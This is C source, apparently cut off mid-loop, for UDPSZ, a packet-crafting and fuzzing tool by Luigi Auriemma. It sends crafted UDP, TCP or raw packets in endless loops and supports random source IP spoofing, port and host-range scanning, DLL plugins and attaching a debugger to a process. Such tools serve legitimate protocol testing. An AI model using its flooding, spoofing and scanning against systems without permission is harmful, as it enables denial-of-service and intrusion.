typedef uint16_t    u16;
typedef uint32_t    u32;
typedef uint64_t    u64;



/*
  important note: this code is incredibly chaotic that even I
  get lost in it so if it looks crazy... yes it is!
  don't waste your time with this tool/code, it's used only for
  my requirements
*/



#define VER         "0.3.3a"
#define ZLIBMAX(X)  ((X) + ((X) / 1000) + 12)
#define myatoi      get_num
#define winerr      std_err

// the "sleepms(1)" below improves "A LOT" the performances with TCP, really!!!
// never use shutdown()
#define CLOSE_SD(X) { \
        if(sd > 0) { \
            if(pck_proto < 0) sleepms(1); \
            close(sd); \
            if(pck_proto < 0) sleepms(1); \
        } \
        sd = -1; \
    }
#define GET_PORT(X) ((X >= 0) ? htons(X) : htons(-X))
#define MYMAXINT    (((unsigned)-1) >> 1)

#ifndef LITTLE_ENDIAN
    #define LITTLE_ENDIAN   0
    #define BIG_ENDIAN      1
#endif

#ifndef SO_EXCLUSIVEADDRUSE
    #define SO_EXCLUSIVEADDRUSE ((u_int)(~SO_REUSEADDR))
#endif
#ifndef TCP_NODELAY
    #define TCP_NODELAY 0x0001
#endif

enum {
    HASH_MD5 = 1,
    HASH_MD5_4,
    HASH_CRC32,
    HASH_CRC16,
    HASH_NONE
};



#include "md5.h"
#include "crc.h"
#include "udpspoof.h"
int debug_privileges(void);
u32 *get_hosts(u8 *str);
DWORD get_pid(u8 *str);
quick_thread(debugger, int pid);
void show_dump(unsigned char *data, unsigned int len, FILE *stream);
void loaddll(u8 *fname, u8 *par);
void load_content(u8 *filename, int type, int offset);
void lamemset(u8 *data, int chr, int size, int chr_bits);
int get_parameter_numbers(u8 *s, int max_parameters, ...);
void myhash(int hash_algo, u8 *out, u8 *in, int insz);
int get_hash(u8 *str);
u32 randit(u32 *rnd);
int recvshow(int sd, int pck_proto, int dumprecv);
u8 *load_file(u8 *filename, int *contentsize);
int cstring(u8 *input, u8 *output, int maxchars, int *inlen);
int hex2byte(u8 *hex);
u8 *load_xstring(u8 *input, int hex, int *contentsize);
int create_socket(int pck_proto, int sd_already_set, struct sockaddr_in *peer);
u8 *get_byte(u8 *data, int *ret_chr, int *ret_chr_bits);
int get_num(u8 *data);
int create_rand_byte(u8 *data, int len, u32 *seed);
int putxx(u8 *data, u32 num, int bits, int endian);
int zip(z_stream *z, u8 *in, u32 insz, u8 *out, u32 outsz);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



typedef struct {
    int     offset;
    u8      *data;
    int     size;
} content_t;
content_t           *content = NULL;
static struct linger ling = {1,1};
static const int    on      = 1;
int                 quiet   = 0,
                    Xendian = LITTLE_ENDIAN,
                    debug   = 0;
crc_context         crc_ctx = {
                             {0},
        /*crc_ctx->poly  =*/ 0x04C11DB7,    // it's the one where the second element is 0x77073096
        /*crc_ctx->size  =*/ 32,
        /*crc_ctx->init  =*/ -1,
        /*crc_ctx->final =*/ -1,
        /*crc_ctx->type  =*/ 0,
        /*crc_ctx->rever =*/ 1
};



#define MAX_PLUGINS 4   // 2 are more than enough
int         plugins = 0;
typedef struct {
    __cdecl int (* sudp_init)(u8 *);
    __cdecl int (* sudp_pck)(u8 *, int);
    __cdecl int (*mysend)(int s, char **retbuf, int len, int flags);
    __cdecl int (*mysendto)(int s, char **retbuf, int len, int flags, const struct sockaddr *to, int tolen);
    __cdecl int (*myrecv)(int s, char *buf, int len, int flags);
    __cdecl int (*myrecvfrom)(int s, char *buf, int len, int flags, struct sockaddr *from, int *fromlen);
} plugin_t;
plugin_t    plugin[MAX_PLUGINS + 1];



int check_next_arg(int i, int argc, char **argv, int is_num) {
    u8      *p;

    i++;
    if(i >= argc) return(-1);
    p = argv[i];
    if(*p == '/') return(-1);
    if(*p == '-') {
        if(!is_num) return(-1);
        p++;  // for negative numbers
    }
    if(!is_num) return(0);
    if((*p >= '0') && (*p <= '9')) return(0);
    return(-1);
}



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    z_stream            z;
    thread_id   tid     = 0;
    DWORD   pid         = 0;
    u32     seed        = 0,
            Xnumber     = 0,
            Xnumber_bck = 0,
            Xmaxnumber  = 0,
            print_time  = 0,
            total_sent  = 0,    // packets sent in the session (like -c sess1,sess2)
            total_pcks  = 0,    // total packets
            tcp_max1    = 0,
            dllwhen     = 1,
            *hosts      = NULL;
    int     sd          = -1,
            sdl         = -1,
            i           = 0,
            t           = 0,
            old_offset  = 0,
            old_content_n = 0,
            zlen        = 0,
            size        = 0,
            sendsize    = 0,
            offset      = 0,
            zoffset     = 0,
            Xoffset     = 0,
            Xoffset_bck = 0,
            randport    = 0,
            randbyte    = 0,
            loop        = 0,
            loopms      = 5,
            chr_bck     = 0,
            chr         = 0,    // int
            upsize      = 0,
            upsizex     = 0,
            Xbits       = 0,
            zbits       = 0,
            dumpsend    = 0,
            dumprecv    = 0,
            x_start     = 0,
            Xmagic      = 0,
            Xrandom     = 0,
            pck_proto   = 0,    // 0:udp negative:tcp positive:raw
            bind_mode   = 0,
            port_scan   = 0,
            hash_offset = 0,
            hash_algo   = 0,
            hash_start  = 0,
            hash_end    = 0,
            hash_seedsz = 0,
            content_n   = 0,
            dyn_size    = 0,
            //dyn_offset  = 0,
            alloc_size  = 0,
            sendlen     = 0,
            host_scan   = -1,
            chr_datasz  = 0,
            chr_bits    = 8;
    int     port        = 0,    // do NOT use u16, -1 is needed for the scanner
            sport       = 0;
    u8      *buff       = NULL,
            *oldbuf     = NULL, // used only for proxocket
            *sendbuff   = NULL,
            //*filename   = NULL,
            //*bstring    = NULL,
            //*xstring    = NULL,
            *spoof      = NULL,
            *recvbuff   = NULL,
            *hash_seed  = NULL,
            *dllname    = NULL,
            *dllpar     = NULL,
            *host       = NULL,
            *debug_pid  = NULL,
            *chr_data   = NULL,
            *str        = NULL;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "UDPSZ " VER "\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 4) {
        printf("\n"
            "Usage: %s [options] <host> <port> <pck_size>\n"
            "\n"
            "Options:\n"
            "-b BYTE    fill the packet with BYTE which can be a char, hex or C string\n"
            "           example: -b a   or   -b 0x61   or   -b 61   -b \"hel\\x6c\\x6f\"\n"
            "           BYTE: -1       format string pattern\n"
            "                 <=0xff   8bit number\n"
            "                 >0xff    32bit little endian number\n"
            "                 char     char pattern, like -b a\n"
            "                 string   string pattern, like -b test\n"
            "-r [SEED]  random packet content\n"
            "-s         packet filled with incremental byte (suggested -b and -l)\n"
            "-p PORT    use source port PORT\n"
            "           PORT: <0  with -S will be decreased\n"
            "                 >0  with -S will be increased\n"
            "-R         random source port (suggested -l)\n"
            "-S         sequential source port (needs -l)\n"
            "-x [M] [E] the size of the packet will go from 0 or M to pck_size (needs -l)\n"
            "           if -x is followed by a number then it will be the start point (0)\n"
            "           if E is 1 and there is content smaller than the size of the packet\n"
            "           it will be expanded from the offset M (like \"contAAAAAAAAAAAAAent\")\n"
            "-y [M] [S] exactly as above but goes from pck_size to 0 or M, S at 1 shrinks\n"
            "-X O B E V special number content, the initial bytes of the packet (max 4)\n"
            "           are a number of B bits (from 8 to 32) of endianess E (l/i or b/n)\n"
            "           at offset O of the packet and incremented at each send (needs -l),\n"
            "           V is the initial value assigned to this number (e.g. -X 0 32 i 0)\n"
            "           after V you can add a special number that increases V each time and\n"
            "           increases also the offset when the cycle reaches the max... use -d\n"
            "-z O W     compress the data in the packet at offset O using W windowbits\n"
            "           (15 is the most commonly used or -15)\n"
            "-f FD [O]  load the content of the packet from FD, the size will be\n"
            "           truncated at pck_size, set it to -1 for using the real file size\n"
            "           from version 0.3.3 you can load all the files you want and you can\n"
            "           also specify the offset where placing them instead of using -o\n"
            "           if O is used then the contents are merged in one packet otherwise\n"
            "           one packet for each content\n"
            "-c STR [O] as above but the content is specified by STR (e.g. -c \"bye all\")\n"
            "           from version 0.2.3 STR is considered a C string like \"hel\\x6c\\x6f\"\n"
            "-C STR [O] as above but in hex format (e.g. -C \"12 34 00 56 789abcdef\")\n"
            "-o OFF     put the data of -f/c/C options at offset OFF of the packet (legacy)\n"
            "-l MS      send infinite packets with a delay of MS milliseconds\n"
            "-d [MAX]   show the hex dump of each packet (debug), optionally of MAX bytes\n"
            "-D [MAX]   try to receive a reply packet and visualize it (debug)\n"
            "           MAX:  -1  waits one millisecond for each receiving\n"
            "                 -2  waits less than one millisecond (default)\n"
            "                 -3  waits forever any receiving\n"
            "                 -4  waits forever only the first receiving\n"
            "                 >0  display only the first MAX bytes of the packet\n"
            "-T [X]     crazy TCP mode, will be used TCP connections instead of UDP packets\n"
            "           X:    -1  use the same connection sending endless packets\n"
            "                  0  close the connection after the first packet (default)\n"
            "                 >0  send X packets for each connection\n"
            "-H A O S E put at offset O the hash/crc defined by algorithm A calculated on\n"
            "           the part of packet that goes from offset S to E (E can be also <= 0)\n"
            "           supported algorithms: md5, md5_32, crc32, crc16\n"
            "           additional parameter is the seed one used for tuning the crc algo\n"
            "-L DLL [P] load a myproxocket or sudppipe dll for customizing the packet:\n"
            "           int mysendto(...cut...);            // proxocket plugin\n"
            "           int sudp_init(char *data);          // if you need initialization\n"
            "           int sudp_pck(char *data, int len);  // each packet goes here\n"
#ifdef WIN32
            "-g PID     debug the process identified by its pid or name\n"
#endif
            "-P IP      spoof the source IP address of the packets, use IP 0 for random\n"
            "           note that in some situations is not possible to send packets bigger\n"
            "           than a certain size so is better to stay under 1400 bytes\n"
            "           if no port is specified (-p/-R/-S) will be used the source port 0\n"
            "-W PROTO   raw packet, except for the IP header the content is choosed by you\n"
            "-q         don't show the dots for each packet sent\n"
            "\n"
            "Special features and notes:\n"
            " a negative <port> forces the tool to send the packet to all the ports above\n"
            " -port, so port -20 will start the scan from port 20, 21, 22 and so on.\n"
            " a negative offset will put the contents at the end of the file.\n"
            " use ever -d for viewing the correctness of packet and effects of the options!\n"
            " <host> can be used also for scanning ranges of hosts, example:\n"
            " 10.0.0.4-100 or 10.0.0.0-255 or 10.0.0-255 or example.com,1.2.3.4,10.0.0.1-9\n"
            "\n", argv[0]);
        exit(1);
    }

    plugins = 0;
    memset(&plugin, 0, sizeof(plugin));

    argc -= 3;
    for(i = 1; i < argc; i++) {
        if(((argv[i][0] != '-') && (argv[i][0] != '/')) || (strlen(argv[i]) != 2)) {
            fprintf(stderr, "\nError: wrong argument (%s)\n", argv[i]);
            exit(1);
        }
        switch(argv[i][1]) {
            case 'b': {
                chr_data = get_byte(argv[++i], &chr, &chr_bits);
                if(chr_data) {
                    chr_datasz = chr;
                    chr = 0;
                }
                break;
            }
            case 'r': {
                randbyte  = 1;
                if(!check_next_arg(i, argc, argv, 1)) seed = get_num(argv[++i]);
                break;
            }
            case 's': randbyte  = 2;                    break;
            case 'p': sport     = get_num(argv[++i]);   break;
            case 'R': randport  = 1;                    break;
            case 'S': randport  = 2;                    break;
            case 'x': {
                upsize          = 1;
                if(!check_next_arg(i, argc, argv, 1)) x_start = get_num(argv[++i]);
                if(!check_next_arg(i, argc, argv, 1)) upsizex = get_num(argv[++i]);
                break;
            }
            case 'y': {
                upsize          = -1;
                if(!check_next_arg(i, argc, argv, 1)) x_start = get_num(argv[++i]);
                if(!check_next_arg(i, argc, argv, 1)) upsizex = get_num(argv[++i]);
                break;
            }
            case 'X': {
                Xoffset         = get_num(argv[++i]);
                Xbits           = get_num(argv[++i]);
                if(Xbits > 32) Xbits = 32;
                if(Xbits <= 4) Xbits <<= 3;
                Xbits           = (Xbits + 7) & (~7);
                Xmaxnumber      = ((u64)1 << Xbits) - 1;
                Xendian         = argv[++i][0];
                Xnumber         = get_num(argv[++i]);
                if(!check_next_arg(i, argc, argv, 1)) Xmagic = get_num(argv[++i]);
                if((tolower(Xendian) == 'l') || (tolower(Xendian) == 'i')) {
                    Xendian = LITTLE_ENDIAN;
                } else if(tolower(Xendian) == 'r') {    // random
                    Xendian = LITTLE_ENDIAN;
                    Xrandom = 1;
                } else {
                    Xendian = BIG_ENDIAN;
                }
                break;
            }
            case 'z': {
                zoffset         = get_num(argv[++i]);
                i++;
                if(!stricmp(argv[i], "zlib")) zbits = 15;
                else if(!stricmp(argv[i], "deflate")) zbits = -15;
                else zbits      = get_num(argv[i]);
                break;
            }
            case 'f': {
                str = argv[++i];
                t = MYMAXINT;
                if(!check_next_arg(i, argc, argv, 1)) t = get_num(argv[++i]);
                load_content(str, -1, t);
                break;
            }
            case 'c': {
                str = argv[++i];
                t = MYMAXINT;
                if(!check_next_arg(i, argc, argv, 1)) t = get_num(argv[++i]);
                load_content(str, 0, t);
                break;
            }
            case 'C': {
                str = argv[++i];
                t = MYMAXINT;
                if(!check_next_arg(i, argc, argv, 1)) t = get_num(argv[++i]);
                load_content(str, 1, t);
                break;
            }
            case 'o': {
                offset          = get_num(argv[++i]);
                break;
            }
            case 'l': {
                loop            = 1;
                loopms          = get_num(argv[++i]);
                break;
            }
            case 'd': {
                dumpsend        = -1;
                if(!check_next_arg(i, argc, argv, 1)) dumpsend = get_num(argv[++i]);
                break;
            }
            case 'D': {
                dumprecv        = -2;
                if(!check_next_arg(i, argc, argv, 1)) dumprecv = get_num(argv[++i]);
                break;
            }
            case 'q': quiet     = 1;                    break;
            case 'P': spoof     = argv[++i];            break;
            case 'T': {
                pck_proto       = -1;
                if(!check_next_arg(i, argc, argv, 1)) tcp_max1 = get_num(argv[++i]);
                break;
            }
            case 'H': {
                hash_algo       = get_hash(argv[++i]);
                hash_offset     = get_num(argv[++i]);
                hash_start      = get_num(argv[++i]);
                hash_end        = get_num(argv[++i]);
                if(!check_next_arg(i, argc, argv, 0)) {
                    hash_seed = argv[++i];
                    if((hash_algo == HASH_CRC32) || (hash_algo == HASH_CRC16)) {
                        get_parameter_numbers(hash_seed, 6,
                            &crc_ctx.poly, &crc_ctx.size, &crc_ctx.init, &crc_ctx.final, &crc_ctx.type, &crc_ctx.rever);
                        hash_seed = NULL;
                    } else {
                        hash_seedsz = cstring(hash_seed, hash_seed, -1, NULL);
                    }
                }
                break;
            }
            case 'L': {
                dllname         = argv[++i];
                if(!check_next_arg(i, argc, argv, 0)) dllpar  = argv[++i];
                if(!check_next_arg(i, argc, argv, 1)) dllwhen = get_num(argv[++i]);
                loaddll(dllname, dllpar);
                break;
            }
            case 'g': debug_pid = argv[++i];            break;
            case 'W': pck_proto = get_num(argv[++i]);   break;
            default: {
                fprintf(stderr, "\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                break;
            }
        }
        if(i >= argc) {
            fprintf(stderr, "\nError: recheck your command-line arguments\n");
            exit(1);
        }
    }

    if((argv[argc][0] == '-') /* negative port problems! || (argv[argc + 1][0] == '-') */) {
        fprintf(stderr, "\nError: recheck your command-line arguments, you missed the last 3 mandatory ones\n");
        exit(1);
    }

    port                  = get_num(argv[argc + 1]);
    if(port < 0) {
        if(!loop) loop = -1;
        port_scan = 1;
        port = -port;
    }
    size                  = get_num(argv[argc + 2]);
    if(size < 0) dyn_size = 1;

    host                  = argv[argc];
    if(strchr(host, ',') || strchr(host, '-')) {    // I can just call get_hosts directly
        if(!loop) loop = -1;                        // but in this way it's faster and safer
        host_scan = 0;
        hosts = get_hosts(host);
        if(!hosts) exit(1);
        peer.sin_addr.s_addr  = 0;
    } else {
        peer.sin_addr.s_addr  = resolv(host);
        if(!peer.sin_addr.s_addr) {
            if(!loop) loop = -1;
            bind_mode = 1;
        }
    }
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(0);
    peerl.sin_family      = AF_INET;
    if(spoof) {
        peerl.sin_addr.s_addr = resolv(spoof);
        if((peerl.sin_addr.s_addr == INADDR_NONE) || (peerl.sin_addr.s_addr == INADDR_ANY)) spoof = "";
    }

    if(peer.sin_addr.s_addr) {
        printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
    }
    if(!quiet) {
             if(pck_proto < 0) printf("- TCP mode\n");
        else if(!pck_proto)    printf("- UDP mode\n");
        else                   printf("- RAW mode (%d)\n", pck_proto);
    }

    if(!seed) seed = time(NULL);
    if(!quiet) printf("- random seed 0x%08x\n", seed);
    randit(&seed);

    //if(offset      < 0) offset = 0;   // NOT
    //if(offset      < 0) dyn_offset = 1;
    if(Xoffset     < 0) Xoffset = 0;
    if(zoffset     < 0) zoffset = 0;
    //if(hash_offset < 0) zoffset = 0;  // NOT

    //load_content(filename, -1);
    //load_content(bstring, 0);
    //load_content(xstring, 1);
    if(content) {
        old_offset = offset;
        t = 0;
        for(content_n = 0; content[content_n].data; content_n++) {
            offset = (content[content_n].offset == MYMAXINT) ? old_offset : content[content_n].offset;
            if((size >= 0) && (offset >= 0) && (content[content_n].size > (size - offset))) {
                content[content_n].size = size - offset;
            }
            if(t < content[content_n].size) t = content[content_n].size;
            if(offset < 0) {
                if(!quiet) printf("- appended content of %d bytes\n", content[content_n].size);
            } else {
                if(!quiet) printf("- content at offset %08x of %d bytes\n", offset, content[content_n].size);
            }
        }
        if(size < 0) {
            size = t;
            if(offset > 0) size += offset;
        }
        offset = old_offset;
    }
    if(size < 0) {
        fprintf(stderr, "\nError: pck_size must be major or equal than 0 and max 65535\n");
        exit(1);
    }
    if(!quiet) printf("- average or maximum packet size: %d\n", size);

    // allocation stuff
    i = size;   // already contains also offset
    if(i < (Xoffset + 4))           i = Xoffset + 4;
    if(i < zoffset)                 i = zoffset;            // ???
    if(i < (size + hash_seedsz))    i = size + hash_seedsz; // size already includes offset
    if(i < 0) i = 0;
    alloc_size = i + 0xffff;    // just to be sure because I can have forgot or will forgive something
    buff = calloc(alloc_size, 1);
    if(!buff) std_err();

    if((Xbits < 0) || (Xbits > 32)) {
        fprintf(stderr, "\nError: wrong or unsupported -X bits value\n");
        exit(1);
    }
    if(Xbits) {
        if(!loop) {
            fprintf(stderr, "\nError: you must use the -l option with -X otherwise it does nothing\n");
            exit(1);
        }
    }
    if((Xoffset < 0) || (Xoffset > size)) {
        fprintf(stderr, "\nError: wrong -X offset value\n");
        exit(1);
    }
    if((zoffset < 0) || (zoffset > size)) {
        fprintf(stderr, "\nError: wrong -z offset value\n");
        exit(1);
    }

    if(randport) {
        peerl.sin_port      = htons((u16)~seed);
    } else {
        sd = create_socket(pck_proto, sd, NULL);
        if(sport) { // source port must be ever different than zero or the OS assigns the first free one
            peerl.sin_port  = GET_PORT(sport);
            if(!quiet) printf("- source port:  %hu\n", ntohs(peerl.sin_port));
            if(!spoof) {
                setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));
                setsockopt(sd, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (char *)&on, sizeof(on));
                if(bind(sd, (struct sockaddr *)&peerl, sizeof(struct sockaddr_in))
                  < 0) std_err();
            }
        }
    }

    if(debug_pid) {
        debug_privileges();
        debug = 1;
        pid = get_pid(debug_pid);
        tid = quick_threadx(debugger, (void *)pid);
    }

    if(dllwhen >= 1) dllwhen--; // packet 1 must become packet 0

    content_n   = 0;
    // backups
    chr_bck     = chr;
    Xoffset_bck = Xoffset;
    Xnumber_bck = Xnumber;
    total_pcks  = 0;
redo:
    chr         = chr_bck;
    Xoffset     = Xoffset_bck;
    Xnumber     = Xnumber_bck;
    total_sent  = 0;

    // dyn_size must be fixed in some way or the multiple content with -l 0 will cause trouble!
    if(dyn_size && content) {
        size = (content[content_n].offset == MYMAXINT) ? old_offset : content[content_n].offset;
        size += content[content_n].size;
    }
    if(size < 0) size = 0;
    //if(dyn_offset && content) offset = size - content[content_n].size;
    //if(offset < 0) offset = 0;

    sendsize = size;
    if(upsize) {
        if(!loop) {
            fprintf(stderr, "\nError: you must use the -l option with -x otherwise it does nothing\n");
            exit(1);
        }
        if(upsize > 0) sendsize = x_start;
    }
    if(sendsize > size) sendsize = size;

    if(!quiet) printf("- send packets:\n");
    print_time = time(NULL);
    for(;;) {
        if(debug_pid && !debug) break;
        if(host_scan >= 0) {
            peer.sin_addr.s_addr = hosts[host_scan++];
            if(!peer.sin_addr.s_addr) {
                if((loop <= 0) || (host_scan <= 1)) break;
                host_scan = 0;
                peer.sin_addr.s_addr = hosts[host_scan++];
            }
            if(!quiet) printf("\n");
            printf("- %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
        }

        if(loop && !bind_mode) {    // very useful
            if((u32)time(NULL) >= (print_time + 5)) {
                print_time = time(NULL);
                if(!quiet) printf("\n- Xoffset %08x   Xnumber %08x   sendsize %08x/%d (%u)\n", Xoffset, Xnumber, sendsize, sendsize, total_sent);
            }
        }

        if((pck_proto < 0) && !bind_mode) {
            if(!tcp_max1 || (tcp_max1 && !total_sent)) sd = create_socket(pck_proto, sd, NULL);
        }
        if(randport) {
            sd = create_socket(pck_proto, sd, NULL);
            i = 0;
            do {
                if(randport == 2) { // sequential
                    peerl.sin_port = GET_PORT(sport);
                    if(sport == -1) {
                        sport = -0xffff;
                    } else if(sport == 0xffff) {
                        sport = 1;
                    } else {
                        sport++;
                    }
                } else {
                    peerl.sin_port = randit(&seed);
                }
                if(spoof) break;
                i++;
                if(i > 10000) std_err();
            } while(bind(sd, (struct sockaddr *)&peerl, sizeof(struct sockaddr_in)) < 0);
        }

        if(chr_data) {
            for(i = 0; i < sendsize; i++) {
                buff[i] = chr_data[i % chr_datasz];
            }
        } else {
            if(randbyte == 0) {
                lamemset(buff, chr, sendsize, chr_bits);
            } else if(randbyte == 1) {
                create_rand_byte(buff, sendsize, &seed);
            } else if(randbyte == 2) {
                //if(chr < 0) chr = 0;  // ok I leave uncommented because it's cool the format string
                lamemset(buff, chr, sendsize, chr_bits);
                chr++;
            }
        }

        if(content) {
            if(!content[content_n].data) content_n = 0;
            old_offset = offset;
            old_content_n = content_n;
            for(; content[content_n].data; content_n++) {
                if(content[content_n].offset == MYMAXINT) {
                    if(content_n != old_content_n) break;
                }
                offset = (content[content_n].offset == MYMAXINT) ? old_offset : content[content_n].offset;
                t = content[content_n].size;
                //if(offset < 0) offset += (size - t) + 1;
                if(offset == -1) offset = -t;
                if(offset < 0) offset = size + offset;
                if(offset < 0) offset = 0;
                if((offset + t) > sendsize) t = sendsize - offset;
                if(t < 0) t = 0;
                if(t > 0) {
                    if((upsize > 0) && upsizex && (x_start >= offset) && ((offset + t) < sendsize)) {
                        i = x_start - offset;
                        if(i > t) i = t;
                        memcpy(buff + offset, content[content_n].data, i);
                        if(t > i) memcpy(buff + sendsize - (t - i), content[content_n].data + i, t - i);
                    } else if((upsize < 0) && upsizex && (x_start >= offset)) {
                        i = x_start - offset;
                        if(i > t) i = t;
                        memcpy(buff + offset, content[content_n].data, i);
                        //memcpy(buff + x_start, content[content_n].data + content[content_n].size - (sendsize - x_start), sendsize - x_start);
                        if(t > i) memcpy(buff + sendsize - (t - i), content[content_n].data + content[content_n].size - (t - i), t - i);
                    } else {
                        memcpy(buff + offset, content[content_n].data, t);
                    }
                }
            }
            //content_n = old_content_n;
            offset = old_offset;
        }
        if(Xbits) {
            if(Xrandom) {
                putxx(buff + Xoffset, randit(&seed), Xbits, Xendian);
            } else {
                putxx(buff + Xoffset, Xnumber, Xbits, Xendian);
            }
        }

        zlen = 0;
        if(zbits) {
            if(!sendbuff) {
                z.zalloc = (alloc_func)0;
                z.zfree  = (free_func)0;
                z.opaque = (voidpf)0;
                if(deflateInit2(&z, Z_BEST_COMPRESSION, Z_DEFLATED, zbits, Z_BEST_COMPRESSION, Z_DEFAULT_STRATEGY) != Z_OK) {
                    fprintf(stderr, "\nError: zlib initialization error\n");
                    exit(1);
                }
                sendbuff = calloc(ZLIBMAX(alloc_size), 1);
                if(!sendbuff) std_err();
            }
            // sendbuff is needed because compression must take place on a different buffer
            memcpy(sendbuff, buff, sendsize);
            if(sendsize >= zoffset) {
                zlen = sendsize - zoffset;
                zlen = zip(&z, buff + zoffset, zlen, sendbuff + zoffset, ZLIBMAX(zlen));
                if(!quiet) printf("- zlen: %d\n", zlen);
                zlen = (zoffset + zlen) - sendsize;
            }
            sendlen  = sendsize + zlen;
        } else {
            sendbuff = buff;    // in case of realloc and so on... useless but saves memory
            sendlen  = sendsize;
        }

        oldbuf = sendbuff;  // keep it here to avoid free() bugs
        if(plugins && (total_pcks >= dllwhen)) {
            for(i = 0; i < plugins; i++) {
                if(plugin[i].sudp_pck) sendlen = plugin[i].sudp_pck(sendbuff, sendlen); // packets modification
                if(plugin[i].mysendto || plugin[i].mysend) {
                    if(plugin[i].mysendto) {
                        sendlen = plugin[i].mysendto(sd, (char **)&sendbuff, sendlen, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
                    } else {
                        sendlen = plugin[i].mysend(sd, (char **)&sendbuff, sendlen, 0);
                    }
                    if(sendlen < 0) {
                        //fprintf(stderr, "\nError: mysend/mysendto plugin returned the error %d\n", sendlen);
                        //exit(1);
                    }
                }
            }
        }

        // from this point no longer use buff, use: sendbuff
        if(sendlen < 0) goto skip_send;

        if(hash_algo) { // no additional checks for this func, it's basic
            i = hash_end;   // like SEEK_END if negative
            if(!i) i = sendlen;
            if(i < 0) i = sendlen + hash_end; // + because it's negative
            if(i < 0) i = sendlen;
            t = hash_start;
            if(t < 0) t = i + hash_start;
            if(t < 0) t = 0;
            if(hash_seed && hash_seedsz) memcpy(sendbuff + i, hash_seed, hash_seedsz);
            myhash(hash_algo, sendbuff + hash_offset, sendbuff + t, (i - t) + hash_seedsz);
        }

        if(dumpsend) {
            i = sendlen;
            if(!quiet) printf("%u bytes (0x%x)\n", i, i);
            if((dumpsend > 0) && (i > dumpsend)) i = dumpsend;
            show_dump(sendbuff, i, stdout);
        } else {
            //if(!dumprecv && !quiet && !bind_mode) fputc('.', stdout);
            if(!quiet && !bind_mode) fputc('.', stdout);
        }
        if((pck_proto < 0) && !bind_mode) {  // connect it
            if(!tcp_max1 || (tcp_max1 && !total_sent)) sd = create_socket(pck_proto, sd, &peer);
        }

        if(spoof) {
            if(!spoof[0]) peerl.sin_addr.s_addr = randit(&seed);
            if(udpspoof(peerl.sin_addr.s_addr, peerl.sin_port, peer.sin_addr.s_addr, peer.sin_port, sendbuff, sendlen) < 0) {
                fprintf(stderr, "\n"
                    "Error: spoofing failed, are you root or admin?\n"
                    "       does your OS support RAW sockets? has it limitations on spoofing?\n"
                    "       possible causes: OS or OS configuration, network configuration, being\n"
                    "       behind a router/NAT, ISP blocks spoofing and others...\n"
                    "\n"
                    "       if the problem is caused by the Operating System a solution can be the\n"
                    "       usage of another OS via a Virtual Machine: on the same computer where I\n"
                    "       have these problems it has been enough to launch Windows 2003 or Linux\n"
                    "       through VirtualBox for bypassing the spoofing limitations of Windows XP\n"
                    );
                exit(1);
            }
        } else {
            if(pck_proto < 0) {
                if(bind_mode) { // lame experiment, I don't care
                    if(sdl <= 0) {
                        peer.sin_addr.s_addr  = INADDR_ANY;
                        peer.sin_port         = htons(port);
                        peer.sin_family       = AF_INET;
                        sdl = create_socket(pck_proto, sdl, &peer);
                        setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));
                        setsockopt(sdl, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (char *)&on, sizeof(on));
                        if(bind(sdl, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
                          < 0) std_err();
                        listen(sdl, SOMAXCONN);
                    }
                    i = sizeof(struct sockaddr_in);
                    sd = accept(sdl, (struct sockaddr *)&peer, &i);
                    if(!quiet) printf("- %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
                    if(dumprecv) if(recvshow(sd, pck_proto, dumprecv) == -2) break;
                }
                send(sd, sendbuff, sendlen, 0); // better to not call std_err()
            } else {
                if(bind_mode) { // lame experiment, I don't care
                    if(!recvbuff) recvbuff = malloc(0xffff);
                    peer.sin_addr.s_addr  = INADDR_ANY;
                    peer.sin_port         = htons(port);
                    peer.sin_family       = AF_INET;
                    setsockopt(sdl, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
                    setsockopt(sdl, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on));
                    setsockopt(sdl, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (char *)&on, sizeof(on));
                    bind(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in));
                    for(;;) {
                        i = sizeof(struct sockaddr_in);
                        i = recvfrom(sd, recvbuff, 0xffff, 0, (struct sockaddr *)&peer, &i);
                        if(i >= 0) break;
                        //sleepms(500); // never
                    }
                    if(!quiet) printf("- %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
                    show_dump(recvbuff, i, stdout);
                }
                if(sendto(sd, sendbuff, sendlen, 0, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
                 < 0) std_err();
            }
        }
        //total_sent += sendlen;
        total_sent++;   // this is more useful than the total amount of bytes
        total_pcks++;

skip_send:
        // lame, only one is supported
        if(plugin[0].mysendto || plugin[0].mysend) {
            if(oldbuf != sendbuff) free(sendbuff);
            sendbuff = oldbuf;
        }

        if(dumprecv && !bind_mode) if(recvshow(sd, pck_proto, dumprecv) == -2) break;

        /* old solution that worked
        if(randport || (pck_proto < 0) {
            if(!tcp_max1) {
                CLOSE_SD(sd);
            } else if(tcp_max1 == (u32)-1) {
                // do nothing because it's endless
            } else if(total_sent >= tcp_max1) {
                CLOSE_SD(sd);
                break;
            }
        }
        */
            if(!tcp_max1) {
                // do nothing //CLOSE_SD(sd);
            } else if(tcp_max1 == (u32)-1) {
                // do nothing because it's endless
            } else if(total_sent >= tcp_max1) {
                break;
            }

        if(!loop) break;

